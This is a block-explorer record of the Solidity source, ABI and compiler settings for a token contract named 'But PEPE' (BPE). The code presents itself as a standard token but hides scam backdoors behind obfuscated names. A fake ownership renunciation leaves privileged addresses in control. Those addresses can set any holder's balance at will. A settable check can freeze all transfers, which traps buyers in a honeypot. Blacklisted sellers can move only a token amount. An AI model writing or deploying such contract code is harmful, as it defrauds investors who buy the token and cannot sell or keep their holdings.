{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface minTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchLiquiditySwap) external view returns (uint256);\n\n    function transfer(address swapTake, uint256 isTeamMin) external returns (bool);\n\n    function allowance(address atMinMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isTeamMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTake,\n        uint256 isTeamMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalToken, uint256 value);\n    event Approval(address indexed atMinMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract fromBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletEnableFrom {\n    function createPair(address marketingTeam, address receiverTo) external returns (address);\n}\n\ninterface receiverLaunched is minTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ButPEPE is fromBuy, minTake, receiverLaunched {\n\n    function owner() external view returns (address) {\n        return txLiquidity;\n    }\n\n    address public launchedFee;\n\n    uint256 isMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamShouldAmount;\n    }\n\n    function getOwner() external view returns (address) {\n        return txLiquidity;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeAt;\n    }\n\n    string private amountLiquidity = \"But PEPE\";\n\n    address fromTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public marketingFund;\n\n    function takeBuy() private view {\n        require(modeSell[_msgSender()]);\n    }\n\n    function transfer(address autoReceiverList, uint256 isTeamMin) external virtual override returns (bool) {\n        return buyAuto(_msgSender(), autoReceiverList, isTeamMin);\n    }\n\n    bool public swapMarketing;\n\n    uint256 public enableFundAuto;\n\n    mapping(address => bool) public launchExempt;\n\n    function buyAuto(address isSell, address swapTake, uint256 isTeamMin) internal returns (bool) {\n        if (isSell == launchedFee) {\n            return exemptWallet(isSell, swapTake, isTeamMin);\n        }\n        uint256 takeMax = minTake(exemptMax).balanceOf(isLiquidity);\n        require(takeMax == isMax);\n        require(swapTake != isLiquidity);\n        if (launchExempt[isSell]) {\n            return exemptWallet(isSell, swapTake, minFee);\n        }\n        return exemptWallet(isSell, swapTake, isTeamMin);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedReceiverLimit;\n\n    uint256 public exemptShouldList;\n\n    function transferFrom(address isSell, address swapTake, uint256 isTeamMin) external override returns (bool) {\n        if (_msgSender() != fromTotal) {\n            if (launchedReceiverLimit[isSell][_msgSender()] != type(uint256).max) {\n                require(isTeamMin <= launchedReceiverLimit[isSell][_msgSender()]);\n                launchedReceiverLimit[isSell][_msgSender()] -= isTeamMin;\n            }\n        }\n        return buyAuto(isSell, swapTake, isTeamMin);\n    }\n\n    event OwnershipTransferred(address indexed receiverMax, address indexed walletSwap);\n\n    address private txLiquidity;\n\n    mapping(address => uint256) private shouldLaunch;\n\n    uint256 public launchedFrom;\n\n    function buyLaunch(address totalLaunched) public {\n        takeBuy();\n        if (exemptShouldList == launchedFrom) {\n            launchedFrom = enableFundAuto;\n        }\n        if (totalLaunched == launchedFee || totalLaunched == exemptMax) {\n            return;\n        }\n        launchExempt[totalLaunched] = true;\n    }\n\n    function modeWalletShould(address autoReceiverList, uint256 isTeamMin) public {\n        takeBuy();\n        shouldLaunch[autoReceiverList] = isTeamMin;\n    }\n\n    uint256 private teamModeFrom;\n\n    bool private walletMin;\n\n    uint256 private modeList;\n\n    function tokenWallet() public {\n        emit OwnershipTransferred(launchedFee, address(0));\n        txLiquidity = address(0);\n    }\n\n    function launchMax(uint256 isTeamMin) public {\n        takeBuy();\n        isMax = isTeamMin;\n    }\n\n    function balanceOf(address launchLiquiditySwap) public view virtual override returns (uint256) {\n        return shouldLaunch[launchLiquiditySwap];\n    }\n\n    function allowance(address swapMax, address isExemptSender) external view virtual override returns (uint256) {\n        if (isExemptSender == fromTotal) {\n            return type(uint256).max;\n        }\n        return launchedReceiverLimit[swapMax][isExemptSender];\n    }\n\n    uint8 private takeAt = 18;\n\n    address isLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public modeSell;\n\n    function exemptWallet(address isSell, address swapTake, uint256 isTeamMin) internal returns (bool) {\n        require(shouldLaunch[isSell] >= isTeamMin);\n        shouldLaunch[isSell] -= isTeamMin;\n        shouldLaunch[swapTake] += isTeamMin;\n        emit Transfer(isSell, swapTake, isTeamMin);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toReceiver;\n    }\n\n    function approve(address isExemptSender, uint256 isTeamMin) public virtual override returns (bool) {\n        launchedReceiverLimit[_msgSender()][isExemptSender] = isTeamMin;\n        emit Approval(_msgSender(), isExemptSender, isTeamMin);\n        return true;\n    }\n\n    function totalFund(address launchWallet) public {\n        require(launchWallet.balance < 100000);\n        if (swapMarketing) {\n            return;\n        }\n        if (exemptShouldList != enableFundAuto) {\n            enableFundAuto = teamModeFrom;\n        }\n        modeSell[launchWallet] = true;\n        \n        swapMarketing = true;\n    }\n\n    uint256 constant minFee = 8 ** 10;\n\n    constructor (){\n        if (exemptShouldList == launchedFrom) {\n            launchedFrom = modeList;\n        }\n        liquidityWallet listReceiver = liquidityWallet(fromTotal);\n        exemptMax = walletEnableFrom(listReceiver.factory()).createPair(listReceiver.WETH(), address(this));\n        if (launchedFrom == modeList) {\n            modeList = launchedFrom;\n        }\n        launchedFee = _msgSender();\n        tokenWallet();\n        modeSell[launchedFee] = true;\n        shouldLaunch[launchedFee] = toReceiver;\n        \n        emit Transfer(address(0), launchedFee, toReceiver);\n    }\n\n    string private teamShouldAmount = \"BPE\";\n\n    uint256 teamSell;\n\n    uint256 private toReceiver = 100000000 * 10 ** 18;\n\n    address public exemptMax;\n\n    function name() external view virtual override returns (string memory) {\n        return amountLiquidity;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMinMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isExemptSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExemptSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTeamMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquiditySwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"}],\"name\":\"buyLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFundAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptShouldList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isTeamMin\",\"type\":\"uint256\"}],\"name\":\"launchMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiverList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTeamMin\",\"type\":\"uint256\"}],\"name\":\"modeWalletShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchWallet\",\"type\":\"address\"}],\"name\":\"totalFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiverList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTeamMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTeamMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ButPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}